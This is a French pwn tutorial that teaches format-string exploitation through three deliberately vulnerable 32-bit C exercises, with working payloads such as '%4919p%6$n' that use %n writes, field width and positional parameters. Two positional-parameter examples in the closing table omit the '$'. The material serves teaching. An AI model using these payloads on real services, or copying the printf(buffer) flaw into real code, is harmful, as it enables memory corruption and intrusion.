---
title: Partie 16 - Exploiter les format strings - primitives de lecture et écriture mémoire (2/5)
date: 2026-04-23 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Exploiter les *format strings* : primitives de lecture et écriture mémoire (2/5)

Dans cette partie, nous allons explorer à travers quelques exercices les **différentes fonctionnalités**, dont certaines **très peu connues**, des chaînes de format. Parmi elles :

- l'utilisation de [largeur de champ](/posts/introduction_au_pwn_partie_16/#utilisation-de-la-largeur-de-champ) ( ex : `%1234p`) ;
- l'utilisation de [paramètres positionnels](/posts/introduction_au_pwn_partie_16/#utilisation-de-paramètres-positionnels) ( ex : `%5$p`).

Les exercices auront une complexité croissante au fur et à mesure que l'on avance.

## Exercice n°1 : Modifier une valeur en mémoire 

Commençons avec l'exercice suivant :

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>

// Compilation : gcc -m32  exercice_1.c -o exercice_1

int main() 
{
    char buffer[0x20000]= {0};
    
    int *val = (int *)malloc(sizeof(int));
    *val = 0xdeadbeef;
    
    fgets(buffer,sizeof(buffer), stdin);
    puts("Entree utilisateur : ");
    printf(buffer);

	if(*val == 0x1337)
    {
        puts("Bravo ! Tu fais partie de l'elite !");
    }
    else
    {
        puts("Ciao bye !");
    }
    
    return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-fmt-exo-1.zip](https://drive.proton.me/urls/2F9N1JX9EW#EtxJ1dqUOHKE)
- 🔎 **SHA256 & Analyse Virus Total** : [b83e8bdcfa9e938b43e56243d16ecac1bc659d8ac9e07c3b2c633d746f27ba68](https://www.virustotal.com/gui/file/b83e8bdcfa9e938b43e56243d16ecac1bc659d8ac9e07c3b2c633d746f27ba68)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-fmt-exo-1 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-fmt-exo-1
```

Pas besoin de s'éterniser sur le fonctionnement du programme, on devine aisément l'objectif : **modifier la valeur pointée par** `val` pour qu'elle vaille `0x1337`.

Il s'agit d'écrire une valeur en mémoire et pour cela on sait qu'il va falloir utiliser le spécificateur `%n`. Mais ensuite ? Comment concrètement modifier la valeur ?

> Bah c'est facile il suffit de ... ah bah non en fait je sais pas 😅.
{: .prompt-info }

Allons-y naïvement étape par étape.

### Afficher les valeurs présentes sur la pile

Tout d'abord nous avons besoin de savoir où se trouve `val` en mémoire. Pour cela, utilisons `%p`. Etant donné que le programme affiche notre saisie, telle quelle, **une seule fois**, il suffit de les faire suivre dans une seule ligne :

```sh
$ ./exercice_1
%p-%p-%p-%p-%p-%p-%p-%p-%p-

Entree utilisateur : 
0x20000-0xf14c35c0-0x60fc5209-(nil)-(nil)-0x62a891a0-0x252d7025-0x70252d70-0x2d70252d-

Ciao bye !
```

> Mettre un tiret `-` entre les `%p` n'est pas obligatoire, cela permet seulement de rendre l'affichage des valeurs **plus lisible**.
> 
> Le nombre de spécificateurs `%p` utilisés est choisi au hasard sans pour autant qu'il ne soit trop petit sinon très peu de valeurs seront affichées.
{: .prompt-tip }

On a :

- la valeur `0x20000` qui est la taille du *buffer* utilisé pour stocker notre saisie ;
- plusieurs pointeurs ;
- de l'ASCII (`0x252d7025-0x70252d70-0x2d70252d`) qui n'est autre que notre saisie : `%p-%p-...`. Sachant que `buffer` est stocké en tant que **variable locale**, son contenu est présent sur la pile. C'est pourquoi, en affichant suffisamment de valeurs avec `%p` on finit par afficher le contenu de `buffer`.

Logiquement, on sait que le pointeur `val` se trouve avant `buffer`, qu'il s'agit d'un pointeur et qu'il est, *a priori*, non nul. Cela réduit les **potentielles cibles** à `0xf14c35c0-0x60fc5209-0x62a891a0`, c'est-à-dire la **2ème** ou **3ème** ou **6ème** valeur affichée (en partant de 1) :

> Il est possible que vous ayez **un affichage différent** de ce qui est présent dans ce cours. Ce n'est pas grave, le plus important est de bien comprendre la **méthodologie** employée.
{: .prompt-tip }

### Afficher le contenu de ces valeurs

Nous avons vu au chapitre précédent qu'il est possible **d'afficher le contenu d'un pointeur** avec le spécificateur `%s`. C'est le moment de s'en servir !

Commençons par afficher le contenu de la deuxième valeur :

```
$ ./exercice_1
%p-%s

Entree utilisateur : 
0x20000-�"����\��\��\��\��\��\��\��\
Ciao bye !

```

Le contenu du pointeur n'est pas de l'ASCII, c'est pourquoi nous avons cet affichage bizarroïde. Utilisons `xxd` afin d'afficher le contenu en hexadécimal :

```sh
$ echo -n "%p-%s" | ./exercice_1 | xxd 

00000000: 456e 7472 6565 2075 7469 6c69 7361 7465  Entree utilisate
00000010: 7572 203a 200a 3078 3230 3030 302d 9820  ur : .0x20000-. 
00000020: adfb b061 5261 b061 5261 b061 5261 b061  ...aRa.aRa.aRa.a
00000030: 5261 b061 5261 b061 5261 b061 5261 b071  Ra.aRa.aRa.aRa.q
00000040: 5261 4369 616f 2062 7965 2021 0a         RaCiao bye !.
```

Nous ne trouvons pas la valeur `0xdeadbeef`. Passons à la prochaine cible, la **3ème** valeur :

```sh
$ echo -n "%p-%p-%s" | ./exercice_1 | xxd

00000000: 456e 7472 6565 2075 7469 6c69 7361 7465  Entree utilisate
00000010: 7572 203a 200a 3078 3230 3030 302d 3078  ur : .0x20000-0x
00000020: 6634 3539 6235 6330 2d81 c3b7 2d43 6961  f459b5c0-...-Cia
00000030: 6f20 6279 6520 210a                      o bye !.
```

Idem, rien de spécial. Passons à la dernière cible, la **6ème** valeur :

```sh
$ echo -n "%p-%p-%p-%p-%p-%s" | ./exercice_1 | xxd

00000000: 456e 7472 6565 2075 7469 6c69 7361 7465  Entree utilisate
00000010: 7572 203a 200a 3078 3230 3030 302d 3078  ur : .0x20000-0x
00000020: 6539 3438 3235 6330 2d30 7836 3430 6263  e94825c0-0x640bc
00000030: 3230 392d 286e 696c 292d 286e 696c 292d  209-(nil)-(nil)-
00000040: [efbe adde] 4369 616f 2062 7965 2021 0a    ....Ciao bye !.
```

Enfin ! Nous sommes tombés sur le pointeur `val` dont le contenu est bien `0xdeadbeef` (cf les valeurs à la dernière ligne entre crochets). Ainsi, en remplaçant `%s` par `%n`, le programme va modifier la valeur du **6ème** pointeur, à savoir `val`.

### Contrôler la valeur écrite

Bon, maintenant il va falloir écrire la valeur `0x1337` à l'adresse pointée par ce pointeur afin de réussir l'exercice.

Pour rappel, `%n` écrit dans le pointeur adéquat le nombre d'octets qui ont déjà été affichés jusque-là, **après substitution des spécificateurs**. 

Comptons le nombre d'octets affichés par notre chaîne de format avant d'arriver à `[efbe adde]` (aka `0xdeadbeef`). Il y en a `len('0x20000-0xf6cc75c0-0x5b76c209-(nil)-(nil)-') == 42`.

> On ne prend **pas** en compte les octets de la chaîne `Entree utilisateur :\n` qui a été affichée grâce à la fonction `puts` et non pas grâce à notre chaîne de format.
{: .prompt-warning }

Il nous reste à faire en sorte d'écrire `0x1337 - 42 == 4877` caractères (ou octets) avant que le spécificateur `%n` ne soit traité. Nous pouvons le faire **en Python** avec :

```
$ python3 -c 'print("%p-%p-%p-%p-%p-"  +  "A"*4877  +  "%n")' | ./exercice_1

Entree utilisateur :    
0x20000-0xf25c75c0-0x62c82209-(nil)-(nil)-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
A(...)

Bravo ! Tu fais partie de l'elite !
```

Que s'est-il passé concrètement ?

Le programme a traité les 5 premiers spécificateurs `%p` en utilisant les 5 premières valeurs trouvées sur la pile. Lors du traitement du spécificateur `%n`, le programme écrit, à l'adresse pointée par la **6ème** valeur (`val`) le nombre d'octets affichés jusque-là : `4919` (ou `0x1337`) :

![](/assets/images/introduction_au_pwn/exo1_fmt_bis.png)

L'erreur à ne pas faire dans cet exercice est de déterminer le nombre de caractère à écrire en prenant en compte ce qui a été écrit **avant la substitution** des spécificateurs.

## Exercice n°2 : Modifier une valeur en mémoire avec un petit *buffer*

Reprenons le même programme sauf que cette fois-ci, le *buffer* est bien plus petit :

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>

// Compilation : gcc -g -m32  exercice_2.c -o exercice_2

int main() 
{
    char buffer[0x200]= {0}; // 0x20000 -> 0x200
    
    int *val = (int *)malloc(sizeof(int));
    *val = 0xdeadbeef;
    
    fgets(buffer,sizeof(buffer), stdin);
    puts("Entree utilisateur : ");
    printf(buffer);

	if(*val == 0x1337)
    {
        puts("Bravo ! Tu fais partie de l'elite !");
    }
    else
    {
        puts("Ciao bye !");
    }
    
    return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-fmt-exo-2.zip](https://drive.proton.me/urls/BRKM3CREPG#wjVXlf53Pf3E)
- 🔎 **SHA256 & Analyse Virus Total** : [dc074f9a7c9833ce4df9e0b1eacb0f55e2c5be583264ec6f35db0a7f74deab07](https://www.virustotal.com/gui/file/dc074f9a7c9833ce4df9e0b1eacb0f55e2c5be583264ec6f35db0a7f74deab07)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-fmt-exo-2 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-fmt-exo-2
```

Bon, on ne va pas réexpliquer comment modifier `val` car la configuration est quasiment identique.

> On peut ptet' déjà réessayer de l'exploiter avec le même *payload* ?
{: .prompt-info }

Bonne idée :

```
python3 -c 'print("%p-%p-%p-%p-%p-"+"A"*4877+"%n")' | ./exercice_2

Entree utilisateur : 
0x200-0xf3da65c0-0x5909b1e8-0x100-(nil)-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(...)Ciao bye !
```

Ça n'a plus l'air de marcher 😢. Comme notre saisie fait plus de `0x1000` octets et que le programme en lit, au plus, `0x200`, cela ne fonctionne plus.

Comment l'exploiter avec un plus petit *buffer* ? 

En vue de réussir l'exploitation du programme, nous devons trouver un moyen d'écrire **beaucoup** d'octets avec ... **moins** d'octets dans la chaîne de format. Je sais ça paraît très chelou cette histoire mais vous allez vite comprendre de quoi il s'agit 😅.

Prenons l'exemple suivant en python : lorsque je souhaite écrire 1000 fois le caractère "A", il suffit d'écrire : `print("A"*1000)`. Cela affichera 1000 caractères. Comptons le nombre de caractères dont nous avons eu besoin pour y parvenir : `len('"A"*1000') == 8`. Ainsi, il nous suffit d'avoir un *buffer* de 8 octets pour en afficher 1000.

> Bah c'est exactement ce que l'on a fait avec `python -c 'print("%p-%p-%p-%p-%p-"  +  "A"*4877  +  "%n")' | ./exe` non ? Nous avons utilisé moins de `0x200` caractères.
{: .prompt-info }

Attention ⚠️ , nous avons utilisé moins de `0x200` caractères dans la **fonction python**. En revanche, la chaîne de format qui sera donnée en tant **qu'entrée utilisateur** au programme est, *in fine* : `%p-%p-%p-%p-%p-AAAAAAAAAAAAAA(...)AAAAAAAAAAAAAAAAAAAAA%n`. Celle-ci fait bien **plus de 1000** caractères.

### Utilisation de la largeur de champ

Afin de contourner cette restriction, nous allons utiliser, tout simplement, une **fonctionnalité** disponible pour certains spécificateurs : la **largeur de champ**.

Il s'agit d'un nombre, appelons-le `N`, qu'il est possible de préciser dans un spécificateur de format afin que, lors de sa substitution, **au moins** `N` caractères soient utilisés pour l'afficher. Si la taille de la valeur à afficher n'est pas assez grande, des espaces (par défaut) sont ajoutés avant la valeur afin d'avoir au moins `N` caractères affichés.

Pour comprendre le fonctionnement, je vous propose d'utiliser la saisie suivante :

```
$ ./exercice_2
%6p

Entree utilisateur : 
 0x200
Ciao bye !
```

En ajoutant le chiffre `6` dans `%6p`, `printf` fera en sorte d'afficher au moins 6 caractères lors de la substitution du spécificateur. Comme `0x200` est constitué de 5 caractères, **un espace est ajouté en préfixe**.

En augmentant la taille de la largeur de champ, cela devient bien plus visible :

```
$ ./exercice_2  
%1000p  

Entree utilisateur :    
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                                                                                                                                        
                                                                           0x200  
Ciao bye !
```

Mine de rien, avec `len("%1000p") == 6` caractères, nous avons pu en afficher plus de 1000. Pas mal non 😎 ?

> En mettant un `0` ou un `.` **devant** la largeur de champ (ex : `%06p` et `%.6p`) le programme utilisera le caractère `0`, au lieu d'un espace, pour faire en sorte d'afficher au moins `N` octets.
{: .prompt-info }

### Résolution de l'exercice 2

Nous allons partir de la précédente solution et la modifier afin qu'elle puisse servir de solution pour l'exercice n°2.

Voici ce qui était donné à `printf` : `%p-%p-%p-%p-%p-AAAAA(...)AAAAAA%n`. Etant donné que nous ne pouvons pas nous permettre d'écrire autant de caractères `'A'` en raison d'une taille plus petite du *buffer* utilisons la fonctionnalité de largeur de champs.

> On peut faire un truc du genre :  `%p-%p-%p-%p-%p-%4877n` ?
{: .prompt-info }

C'est presque l'idée. Le problème est que préciser une largeur de champ au spécificateur `%n` n'a aucun effet 🙅‍♂️ vu qu'il n'est pas censé afficher de valeur. Par contre, nous pouvons l'utiliser sur le spécificateur `%p` situé juste avant `%n` :

```
$ echo '%p-%p-%p-%p-%4877p-%n' | ./exercice_2

Entree utilisateur :
(...)

Ciao bye !
```

Ce n'est pas encore ça mais on y est presque. En mettant un point d'arrêt dans **gdb** à lors de la comparaison `if(*val == 0x1337)` nous comprenons d'où vient le problème : 

![](/assets/images/introduction_au_pwn/1330_fmt.png)

Nous avons réussi à écrire `0x1330` dans `val`. Il nous reste encore à écrire 7 caractères pour avoir la valeur attendue :

```
$ echo '%p-%p-%p-%p-%4884p-%n' | ./exercice_2

Entree utilisateur :
(...)

Bravo ! Tu fais partie de l'elite !
```

> Si vous ne comprenez pas d'où provient la valeur `4884`, rappelez-vous que `%n` ne compte les caractères affichés qu'une fois **que tous les précédents spécificateurs ont été substitués**. 
> 
> En l'occurrence, avec `%p-%p-%p-%p-%p-` nous obtenons par exemple : `len('0x200-0xe9ad85c0-0x56f7a1e8-0x100-(nil)-') == 40` caractères. Il nous reste donc : `0x1337 - 40 == 4879` caractères à écrire.
> 
> Sachant que nous allons ajouter une largeur de champ au dernier spécificateur `%p` (celui qui affiche `(nil)`), il faut déduire ces 5 caractères de `40` ➡️ `40 - 5 == 35` (sinon cela revient à compter `(nil)` deux fois).
> 
> Au final, ce ne sont pas `0x1337 - 40` caractères à écrire mais `0x1337 - 35 == 4884` et là, **le compte est bon** 🥳  !
{: .prompt-tip }

## Exercice n°3 : Modifier une valeur en mémoire avec un *buffer* minuscule

Et si on poussait le bouchon encore plus loin 😏 ? Saurez-vous résoudre l'exercice suivant lorsque *buffer* ne dispose plus que de `0x10` octets ?

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <stdint.h>

// Compilation : gcc -g -m32  exercice_3.c -o exercice_3

int main() 
{
    char buffer[0x10]= {0}; // 0x200 -> 0x10
    
    int *val = (int *)malloc(sizeof(int));
    *val = 0xdeadbeef;
    
    fgets(buffer,sizeof(buffer), stdin);
    puts("Entree utilisateur : ");
    printf(buffer);

	if(*val == 0x1337)
    {
        puts("Bravo ! Tu fais partie de l'elite !");
    }
    else
    {
        puts("Ciao bye !");
    }
    
    return 0;
}
```

Accès au conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-fmt-exo-3.zip](https://drive.proton.me/urls/QQWMZTG1PM#rP8ePDqJu2Fa)
- 🔎 **SHA256 & Analyse Virus Total** : [ebcb04c28a895728009a7d6bc3635ac5e88bd90d5566c9ab670de5c48883a6cb](https://www.virustotal.com/gui/file/ebcb04c28a895728009a7d6bc3635ac5e88bd90d5566c9ab670de5c48883a6cb)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-fmt-exo-3 .

docker run -it --rm -p 1234:1234 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-fmt-exo-3
```

Vous vous en doutez, la solution du précédent exercice ne peut plus être utilisée car elle a une taille de `len('%p-%p-%p-%p-%4884p-%n') == 21` octets et que nous pouvons en utiliser **au plus 16**.

Pour y parvenir, découvrons une nouvelle fonctionnalité des chaînes de format : **les paramètres positionnels** (ou *positional parameter* 🇬🇧).

### Utilisation de paramètres positionnels

Encore un terme barbare pour une fonctionnalité très pratique. Vous vous souvenez ? Lorsque nous voulions écrire au 6ème argument de `printf` nous étions obligés de précéder `%n` par 5 spécificateurs `%p`. Imaginez si nous pouvions directement **spécifier l'index du paramètre** sur lequel un spécificateur est appliqué. 

Cela est possible, justement, grâce au **paramètre positionnel** !

#### Rappel sur l'ordre de de consommation des arguments par les spécificateurs

Revenons quelques instants à **l'exercice 2** et utilisons l'entrée suivante : 

```
$ echo '%p-%p-%p-%p-%p' | ./exercice_2    

Entree utilisateur :    
0x200-0xea0f65c0-0x5af0f1e8-0x100-(nil)  

Ciao bye !
```

Les valeurs sont affichées dans **l'ordre où elles sont lues dans la pile**. Vous pouvez le constater de vous-même en mettant un point d'arrêt dans **gdb** avant `printf(buffer)` :

![](/assets/images/introduction_au_pwn/stack_fmt_order.png)

> Sur certaines valeurs, des **différences** sont observables sur les octets de poids fort en raison de l'**ASLR**. Il est tout de même possible de s'y retrouver grâce à **l'octet et demi de poids faible** de ces valeurs.
{: .prompt-tip }

En se basant sur **l'état de la pile**, l'appel à `printf` revient à faire : 

```cpp
printf("%p-%p-%p-%p-%p",0x200,0xf7f995c0,0x565561e8,0x100,0);
```

#### Fonctionnement des paramètres positionnels

Ceci était un petit rappel. Analysons maintenant comment utiliser les paramètres positionnels pour **modifier l'ordre** dans lequel les arguments sont "consommés".

Un spécificateur peut avoir un ou aucun paramètre positionnel. Ce dernier est précisé en utilisant le caractère `$`. Par exemple : `%2$p`, `%1$c` et même `%10$n`. En effet, bien que le spécificateur `%n` n'accepte pas de largeur de champ, il accepte néanmoins un paramètre positionnel.

Pour faire simple : un **paramètre positionnel est un index** que l'on attribue à un spécificateur.

Prenons l'exemple suivant :

```
echo '%5$p-%4$p-%3$p-%2$p-%1$p' | ./exercice_2

Entree utilisateur : 
(nil)-0x100-0x5a8e41e8-0xf26005c0-0x200

Ciao bye !
```

Grâce à l'utilisation du paramètre positionnel, nous pouvons même **inverser l'ordre** dans lequel les arguments sont utilisés.

Le nombre d'apparitions d'un index n'est pas limité :

```
echo '%4$p-%4$p-%4$p-%4$p-%4$p-%4$p-%4$p' | ./exercice_2   

Entree utilisateur : 
0x100-0x100-0x100-0x100-0x100-0x100-0x100

Ciao bye !
```

Par ailleurs, il est possible de combiner :

- la largeur de champ (ex : `%100p`) ;
- un paramètre positionnel (ex : `%4$p`).

Cela peut être fait de cette manière :

![](/assets/images/introduction_au_pwn/fmt_combine.png)
Il y a pas mal de caractères utilisés, on dirait presque une *regex*. Mais au moins cela permet, en utilisant un seul spécificateur de :

- préciser l'**index** du paramètre sur lequel appliquer le spécificateur ➡️ **index n°4** ;
- préciser le nombre minimum de caractères à afficher ➡️ **100 caractères**.

Pour s'y retrouver il suffit de se rappeler de ce qui est avant et après le signe `$` :

- **avant** ➡️ **paramètre positionnel** ;
- **après** ➡️ **largeur de champ**.

Un **moyen mnémotechnique** pour se rappeler de cet ordre est l'université [P$L](https://fr.wikipedia.org/wiki/Universit%C3%A9_Paris_Sciences_et_Lettres) (**P**aris **S**ciences et **L**ettres). Il est pas ouf mais on fait avec les moyens du bord que voulez-vous que je vous dise 🙃.

### Résolution de l'exercice 3

Et si nous résolvions le 3ème exercice ? Nous disposons désormais de tout ce qu’il faut. Nous avons besoin d'écrire : 

1. `0x1337 == 4919` octets ;
2. dans l'adresse pointée par le 6ème argument.

Comme `%n` n'accepte pas de largeur de champ, il n'est pas possible d'utiliser simplement : `%6$4919n`. Par contre, nous pouvons toujours spécifier l'index du paramètre avec `%6$n`. Pour afficher `4919` caractères, nous pourrons le faire précéder d'un classique `%4919p` :

```
$ echo '%4919p%6$n' | ./exercice_3 

Entree utilisateur : 
(...)

Bravo ! Tu fais partie de l'elite !
```

Pas mal non 😎 ?

## 📋 Synthèse

A travers cette série d'exercices, nous avons appris **à écrire des valeurs arbitraires** à une adresse pointée par un pointeur situé sur la pile. De plus, nous avons pu découvrir **deux fonctionnalités** des chaînes de format qui sont très utiles en *pwn* :

| Fonctionnalité            | Utilité en *pwn*                                                                                                                                                                            | Exemples                     |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------- |
| **Largeur de champ**      | **Ecrire un nombre arbitraire d'octets** lors de la substitution d'un spécificateur. Permet notamment d'écrire **beaucoup** de données lorsque l'on ne dispose pas d'un **grand** *buffer*. | `%213p`, `%.456c`, `%01234x` |
| **Paramètre positionnel** | Choisir l'**argument** sur lequel s'appliquera un spécificateur à partir de son **index** (dans la pile).                                                                                   | `%7$n`, `%12p`, `%3s`        |
